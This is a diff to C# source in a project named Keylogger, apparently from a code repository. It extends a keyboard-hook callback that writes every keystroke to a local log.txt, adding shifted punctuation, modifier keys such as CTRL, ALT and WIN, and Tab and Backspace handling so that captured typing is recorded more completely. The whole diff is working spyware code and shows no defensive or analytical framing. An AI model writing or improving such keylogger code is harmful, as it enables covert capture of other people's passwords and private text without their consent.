@@ -46,6 +46,7 @@ namespace Keylogger
                 int vkCode = Marshal.ReadInt32(lParam);
                 Console.WriteLine((Keys)vkCode);
                 StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+      
                 switch ((Keys)vkCode)
                 {
                     case Keys.NumPad0:
@@ -93,20 +94,114 @@ namespace Keylogger
                     case Keys.RShiftKey:
                         break;
 
+                    case Keys.Oemcomma:
+                        if (Control.ModifierKeys != Keys.Shift)
+                            sw.Write(",");
+                        else
+                            sw.Write("<");
+                        break;
+
                     case Keys.OemPeriod:
-                        sw.Write(".");
+                        if (Control.ModifierKeys != Keys.Shift)
+                            sw.Write(".");
+                        else
+                            sw.Write(">");
+                        break;
+
+                    case Keys.OemQuestion:
+                        if (Control.ModifierKeys != Keys.Shift)
+                            sw.Write("/");
+                        else
+                            sw.Write("?");
+                        break;
+
+                    case Keys.OemSemicolon:
+                        if (Control.ModifierKeys != Keys.Shift)
+                            sw.Write(";");
+                        else
+                            sw.Write(":");
+                        break;
+
+                    case Keys.Oemtilde:
+                        if (Control.ModifierKeys != Keys.Shift)
+                            sw.Write("`");
+                        else
+                            sw.Write("~");
+                        break;
+
+                    case Keys.OemOpenBrackets:
+                        if (Control.ModifierKeys != Keys.Shift)
+                            sw.Write("[");
+                        else
+                            sw.Write("{");
+                        break;
+
+                    case Keys.OemCloseBrackets:
+                        if (Control.ModifierKeys != Keys.Shift)
+                            sw.Write("]");
+                        else
+                            sw.Write("}");
+                        break;
+
+                    case Keys.Oemplus:
+                        if (Control.ModifierKeys != Keys.Shift)
+                            sw.Write("=");
+                        else
+                            sw.Write("+");
+                        break;
+
+                    case Keys.OemMinus:
+                        if (Control.ModifierKeys != Keys.Shift)
+                            sw.Write("-");
+                        else
+                            sw.Write("_");
+                        break;
+
+                    case Keys.OemPipe:
+                        sw.Write("|");
+                        break;
+
+                    case Keys.OemQuotes:
+                        if (Control.ModifierKeys != Keys.Shift)
+                            sw.Write("'");
+                        else
+                            sw.Write("\"");
+                        break;
+
+                    case Keys.OemBackslash:
+                        sw.Write("\\");
                         break;
 
                     case Keys.LMenu:
                         sw.Write("{ALT}");
                         break;
 
-                    case Keys.Oem7:
-                        sw.Write("'");
+                    case Keys.RMenu:
+                        sw.Write("{ALT}");
                         break;
 
-                    case Keys.Oemcomma:
-                        sw.Write(",");
+                    case Keys.LControlKey:
+                        sw.Write("{CTRL}");
+                        break;
+
+                    case Keys.RControlKey:
+                        sw.Write("{CTRL}");
+                        break;
+
+                    case Keys.LWin:
+                        sw.Write("{WIN}");
+                        break;
+
+                    case Keys.RWin:
+                        sw.Write("{WIN}");
+                        break;
+
+                    case Keys.Tab:
+                        sw.Write("    ");
+                        break;
+
+                    case Keys.Back:
+                        sw.Write("{BCK}");
                         break;
 
                     default:
